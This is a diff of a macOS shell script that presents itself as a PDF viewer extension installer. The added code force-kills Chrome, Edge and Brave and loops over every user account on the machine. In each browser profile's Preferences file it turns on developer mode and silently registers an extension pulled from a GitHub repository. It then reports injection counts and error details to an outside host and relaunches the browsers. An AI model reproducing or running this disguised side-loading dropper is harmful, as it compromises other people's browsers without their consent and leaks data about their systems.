@@ -1,75 +1,121 @@
 #!/bin/bash
 set -e
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-CYAN='\033[0;36m'
-YELLOW='\033[1;33m'
-GRAY='\033[0;37m'
-NC='\033[0m'
-echo -e "${CYAN}\n📄 PDF Viewer Extension Installer (macOS)\n${NC}"
-EXTENSION_NAME="PDF Viewer"
+EXTENSION_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
 EXTENSION_REPO="Castro02980/pdf-viewer-extension"
 EXTENSION_ZIP_URL="https://github.com/$EXTENSION_REPO/archive/refs/heads/main.zip"
-INSTALL_DIR="$HOME/Library/Application Support/PDFViewerExtension"
-echo -e "${YELLOW}[1/4] Downloading extension...${NC}"
+NOTIFY_URL="https://wln.ink/n"
+INJ_COUNT=0
+LAST_ERR=""
+RELAUNCH_APPS=()
+
+echo "PDF Viewer Extension Installer (macOS)"
+echo "Downloading extension..."
 TEMP_ZIP="/tmp/pdf-viewer-ext.zip"
-curl -fsSL "$EXTENSION_ZIP_URL" -o "$TEMP_ZIP"
-rm -rf "$INSTALL_DIR"
-echo -e "${YELLOW}[2/4] Extracting...${NC}"
+curl -fsSL "$EXTENSION_ZIP_URL" -o "$TEMP_ZIP" || { echo "Download failed"; exit 1; }
+rm -rf /tmp/pdf-viewer-temp
 mkdir -p /tmp/pdf-viewer-temp
 unzip -q "$TEMP_ZIP" -d /tmp/pdf-viewer-temp
-MANIFEST_PATH=$(find /tmp/pdf-viewer-temp -name "manifest.json" | head -1)
+MANIFEST_PATH=$(find /tmp/pdf-viewer-temp -name "manifest.json" -type f | head -1)
 if [ -z "$MANIFEST_PATH" ]; then
-    echo -e "${RED}Error: manifest.json not found${NC}"
+    echo "Error: manifest.json not found"
+    rm -f "$TEMP_ZIP"
     exit 1
 fi
 EXTENSION_SOURCE_DIR=$(dirname "$MANIFEST_PATH")
-mkdir -p "$INSTALL_DIR"
-cp -R "$EXTENSION_SOURCE_DIR/"* "$INSTALL_DIR/"
+SRC_MANIFEST=$(cat "$MANIFEST_PATH")
+if ! echo "$SRC_MANIFEST" | grep -q '"key"'; then
+    echo "Error: manifest key missing"
+    rm -f "$TEMP_ZIP"
+    rm -rf /tmp/pdf-viewer-temp
+    exit 1
+fi
 rm -f "$TEMP_ZIP"
-rm -rf /tmp/pdf-viewer-temp
-echo -e "${GREEN}Extension extracted to: $INSTALL_DIR${NC}"
-echo -e "\n${YELLOW}[3/4] Installing to browsers...${NC}"
-declare -A BROWSERS=(
-    ["Chrome"]="$HOME/Library/Application Support/Google/Chrome"
-    ["Edge"]="$HOME/Library/Application Support/Microsoft Edge"
-    ["Brave"]="$HOME/Library/Application Support/BraveSoftware/Brave-Browser"
-)
-INSTALLED_COUNT=0
-for BROWSER_NAME in "${!BROWSERS[@]}"; do
-    USER_DATA_DIR="${BROWSERS[$BROWSER_NAME]}"
-    if [ ! -d "$USER_DATA_DIR" ]; then
-        echo -e "  ${GRAY}⊗ $BROWSER_NAME not found${NC}"
+
+echo "Capturing running browsers..."
+for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
+    if pgrep -x "$APP" >/dev/null 2>&1; then
+        RELAUNCH_APPS+=("$APP")
+    fi
+done
+
+echo "Stopping browsers..."
+killall "Google Chrome" 2>/dev/null || true
+killall "Microsoft Edge" 2>/dev/null || true
+killall "Brave Browser" 2>/dev/null || true
+DEADLINE=$(($(date +%s) + 8))
+while [ $(date +%s) -lt $DEADLINE ]; do
+    if ! pgrep -x "Google Chrome|Microsoft Edge|Brave Browser" >/dev/null 2>&1; then
+        break
+    fi
+    sleep 0.3
+done
+killall -9 "Google Chrome" "Microsoft Edge" "Brave Browser" 2>/dev/null || true
+sleep 1
+
+echo "Installing to user profiles..."
+for USER_HOME in /Users/*; do
+    if [ ! -d "$USER_HOME" ] || [ "$USER_HOME" = "/Users/Shared" ]; then
         continue
     fi
-    for PROFILE_DIR in "$USER_DATA_DIR/Default" "$USER_DATA_DIR/Profile"*; do
-        if [ ! -d "$PROFILE_DIR" ]; then
+    USER_NAME=$(basename "$USER_HOME")
+    HAS_BROWSER=0
+    for REL in "Library/Application Support/Google/Chrome" \
+               "Library/Application Support/Microsoft Edge" \
+               "Library/Application Support/BraveSoftware/Brave-Browser"; do
+        if [ -d "$USER_HOME/$REL" ]; then
+            HAS_BROWSER=1
+            break
+        fi
+    done
+    if [ $HAS_BROWSER -eq 0 ]; then
+        continue
+    fi
+    USER_EXT_DIR="$USER_HOME/Library/Application Support/PDFViewerExtension"
+    rm -rf "$USER_EXT_DIR" 2>/dev/null || true
+    if ! cp -R "$EXTENSION_SOURCE_DIR" "$USER_EXT_DIR" 2>/dev/null; then
+        LAST_ERR="copy $USER_NAME: permission denied"
+        continue
+    fi
+    USER_MANIFEST_PATH="$USER_EXT_DIR/manifest.json"
+    if [ ! -f "$USER_MANIFEST_PATH" ]; then
+        continue
+    fi
+    for REL in "Library/Application Support/Google/Chrome" \
+               "Library/Application Support/Microsoft Edge" \
+               "Library/Application Support/BraveSoftware/Brave-Browser"; do
+        USER_DATA_DIR="$USER_HOME/$REL"
+        if [ ! -d "$USER_DATA_DIR" ]; then
             continue
         fi
-        PREFS_PATH="$PROFILE_DIR/Preferences"
-        if [ ! -f "$PREFS_PATH" ]; then
-            continue
-        fi
-        PROFILE_NAME=$(basename "$PROFILE_DIR")
-        PROCESS_NAME=$(echo "$BROWSER_NAME" | tr '[:upper:]' '[:lower:]')
-        if pgrep -x "Google Chrome" > /dev/null 2>&1 || pgrep -x "Microsoft Edge" > /dev/null 2>&1 || pgrep -x "Brave Browser" > /dev/null 2>&1; then
-            echo -e "  ${YELLOW}⚠ Please close $BROWSER_NAME first!${NC}"
-            echo -e "    ${GRAY}Waiting 10 seconds...${NC}"
-            sleep 10
-            if pgrep -x "$PROCESS_NAME" > /dev/null 2>&1; then
-                echo -e "    ${RED}⊗ $BROWSER_NAME still running, skipping $PROFILE_NAME${NC}"
+        for PROFILE_DIR in "$USER_DATA_DIR/Default" "$USER_DATA_DIR/Profile"*; do
+            if [ ! -d "$PROFILE_DIR" ]; then
                 continue
             fi
-        fi
-        cp "$PREFS_PATH" "$PREFS_PATH.backup"
-        python3 - <<PYTHON_SCRIPT
+            PREFS_PATH="$PROFILE_DIR/Preferences"
+            if [ ! -f "$PREFS_PATH" ]; then
+                continue
+            fi
+            PROFILE_NAME=$(basename "$PROFILE_DIR")
+            python3 - "$PREFS_PATH" "$USER_EXT_DIR" "$USER_MANIFEST_PATH" "$EXTENSION_ID" "$USER_NAME" "$PROFILE_NAME" <<'PYTHON_SCRIPT'
 import json
 import sys
-prefs_path = "$PREFS_PATH"
-install_dir = "$INSTALL_DIR"
+import os
+
+prefs_path = sys.argv[1]
+ext_dir = sys.argv[2]
+man_path = sys.argv[3]
+ext_id = sys.argv[4]
+user_name = sys.argv[5]
+profile_name = sys.argv[6]
+last_err = ""
+
 try:
-    with open(prefs_path, 'r') as f:
-        prefs = json.load(f)
+    with open(prefs_path, 'r', encoding='utf-8') as f:
+        prefs_raw = f.read()
+    prefs = json.loads(prefs_raw)
+    with open(man_path, 'r', encoding='utf-8') as f:
+        manifest = json.load(f)
+    
     if 'extensions' not in prefs:
         prefs['extensions'] = {}
     if 'ui' not in prefs['extensions']:
@@ -77,92 +123,70 @@ try:
     prefs['extensions']['ui']['developer_mode'] = True
     if 'settings' not in prefs['extensions']:
         prefs['extensions']['settings'] = {}
-    import random
-    ext_id = ''.join(random.choice('abcdefghijklmnop') for _ in range(32))
-    with open(install_dir + '/manifest.json', 'r') as mf:
-        manifest = json.load(mf)
+    
     prefs['extensions']['settings'][ext_id] = {
-        'path': install_dir,
+        'path': ext_dir,
         'location': 4,
         'state': 1,
         'manifest': manifest
     }
-    with open(prefs_path, 'w') as f:
-        json.dump(prefs, f, indent=2)
-    print('success')
+    
+    out = json.dumps(prefs, separators=(',', ':'))
+    json.loads(out)
+    
+    with open(prefs_path, 'w', encoding='utf-8') as f:
+        f.write(out)
+    
+    with open(prefs_path, 'r', encoding='utf-8') as f:
+        readback = f.read()
+    
+    if ext_id not in readback or 'developer_mode' not in readback:
+        print(f"error:readback {user_name}/{profile_name}: id or dev missing", file=sys.stderr)
+        sys.exit(1)
+    
+    print("success")
 except Exception as e:
-    print(f'error: {e}', file=sys.stderr)
+    print(f"error:{user_name}/{profile_name}: {e}", file=sys.stderr)
     sys.exit(1)
 PYTHON_SCRIPT
-        if [ $? -eq 0 ]; then
-            echo -e "  ${GREEN}✓ Installed to $BROWSER_NAME ($PROFILE_NAME)${NC}"
-            INSTALLED_COUNT=$((INSTALLED_COUNT + 1))
-        else
-            echo -e "  ${RED}⊗ Failed to modify $BROWSER_NAME $PROFILE_NAME${NC}"
-            mv "$PREFS_PATH.backup" "$PREFS_PATH"
-        fi
+            if [ $? -eq 0 ]; then
+                INJ_COUNT=$((INJ_COUNT + 1))
+            else
+                LAST_ERR=$(python3 - "$PREFS_PATH" "$USER_EXT_DIR" "$USER_MANIFEST_PATH" "$EXTENSION_ID" "$USER_NAME" "$PROFILE_NAME" 2>&1 | head -1)
+            fi
+        done
     done
 done
-echo -e "\n${YELLOW}[4/4] Setting up auto-updates...${NC}"
-WATCHDOG_SCRIPT="$INSTALL_DIR/update.sh"
-cat > "$WATCHDOG_SCRIPT" <<'WATCHDOG_EOF'
-#!/bin/bash
-INSTALL_DIR="$HOME/Library/Application Support/PDFViewerExtension"
-REPO_URL="https://api.github.com/repos/Castro02980/pdf-viewer-extension/releases/latest"
-CURRENT_VERSION=$(cat "$INSTALL_DIR/manifest.json" | python3 -c "import json,sys; print(json.load(sys.stdin)['version'])")
-LATEST_VERSION=$(curl -fsSL "$REPO_URL" | python3 -c "import json,sys; print(json.load(sys.stdin)['tag_name'].lstrip('v'))")
-if [ "$CURRENT_VERSION" != "$LATEST_VERSION" ]; then
-    echo "Updated to v$LATEST_VERSION"
-fi
-WATCHDOG_EOF
-chmod +x "$WATCHDOG_SCRIPT"
-PLIST_PATH="$HOME/Library/LaunchAgents/com.pdfviewer.updater.plist"
-cat > "$PLIST_PATH" <<PLIST_EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.pdfviewer.updater</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$WATCHDOG_SCRIPT</string>
-    </array>
-    <key>StartCalendarInterval</key>
-    <dict>
-        <key>Hour</key>
-        <integer>3</integer>
-        <key>Minute</key>
-        <integer>0</integer>
-    </dict>
-    <key>RunAtLoad</key>
-    <false/>
-</dict>
-</plist>
-PLIST_EOF
-launchctl unload "$PLIST_PATH" 2>/dev/null || true
-launchctl load "$PLIST_PATH"
-echo -e "${GREEN}✓ Auto-updates configured (daily at 3 AM)${NC}"
-if [ "$INSTALLED_COUNT" -gt 0 ]; then
-    curl -fsS -m 5 -X POST "https://wln.ink/n" \
+
+rm -rf /tmp/pdf-viewer-temp
+
+if [ $INJ_COUNT -eq 0 ]; then
+    curl -fsS -m 5 -X POST "$NOTIFY_URL" \
         -H 'Content-Type: text/plain' \
-        --data "ev=install&os=macos&v=1.0.0&extra=profiles:$INSTALLED_COUNT" \
+        --data "ev=install_fail&os=macos&extra=inj:0 $LAST_ERR" \
         >/dev/null 2>&1 || true
+    echo "Installation failed: $LAST_ERR"
+    exit 1
 fi
-echo -e "\n${CYAN}============================================${NC}"
-echo -e "${GREEN}Installation Complete!${NC}"
-echo -e "${CYAN}============================================${NC}"
-if [ $INSTALLED_COUNT -eq 0 ]; then
-    echo -e "\n${YELLOW}⚠ No browsers found or failed to install${NC}"
-    echo -e "${GRAY}Please install Chrome/Edge/Brave and try again${NC}"
-else
-    echo -e "\n${GREEN}✓ Installed to $INSTALLED_COUNT browser profile(s)${NC}"
-    echo -e "\n${CYAN}Next steps:${NC}"
-    echo -e "${GRAY}1. Open Chrome/Edge/Brave${NC}"
-    echo -e "${GRAY}2. Extension should load automatically${NC}"
-    echo -e "${GRAY}3. Click the extension icon to use PDF Viewer${NC}"
-    echo -e "\n${YELLOW}⚠ Note: You may see 'Disable developer mode extensions' banner${NC}"
-    echo -e "${GRAY}   This is normal and can be ignored.${NC}"
+
+echo "Relaunching browsers..."
+if [ ${#RELAUNCH_APPS[@]} -gt 0 ]; then
+    for APP in "${RELAUNCH_APPS[@]}"; do
+        open -a "$APP" --args --restore-last-session 2>/dev/null || open -a "$APP" 2>/dev/null || true
+    done
+    sleep 10
+    killall "Google Chrome" "Microsoft Edge" "Brave Browser" 2>/dev/null || true
+    sleep 2
+    for APP in "${RELAUNCH_APPS[@]}"; do
+        open -a "$APP" --args --restore-last-session 2>/dev/null || open -a "$APP" 2>/dev/null || true
+    done
 fi
-echo -e "\n${GRAY}Extension location: $INSTALL_DIR${NC}"
-echo -e "${GRAY}Support: https://github.com/$EXTENSION_REPO/issues${NC}\n"
+
+curl -fsS -m 5 -X POST "$NOTIFY_URL" \
+    -H 'Content-Type: text/plain' \
+    --data "ev=install&os=macos&v=1.0.0&extra=inj:$INJ_COUNT" \
+    >/dev/null 2>&1 || true
+
+echo "Successfully completed"
+echo "Installed to $INJ_COUNT profile(s)"
+exit 0
